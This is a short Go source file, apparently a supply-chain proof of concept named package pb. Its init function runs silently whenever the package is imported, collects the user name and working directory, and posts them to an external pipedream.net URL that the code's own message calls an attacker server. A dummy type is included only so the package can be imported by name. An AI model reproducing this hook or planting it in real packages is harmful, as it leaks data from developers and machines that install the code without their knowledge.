package pb

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

// Dummy exported type (required for named import like `pb`)
type Dummy struct{}

func init() {
	user := os.Getenv("USER")
	cwd, _ := os.Getwd()
	data := url.Values{}
	data.Set("user", user)
	data.Set("cwd", cwd)

	// Replace with your actual VPS URL
	vpsURL := "https://eou39l9f2i96s48.m.pipedream.net/poc"

	// Send callback
	_, err := http.PostForm(vpsURL, data)
	if err != nil {
		fmt.Println("[PoC] Failed to send data:", err)
	} else {
		fmt.Println("[PoC] Callback sent successfully to attacker server")
	}
}
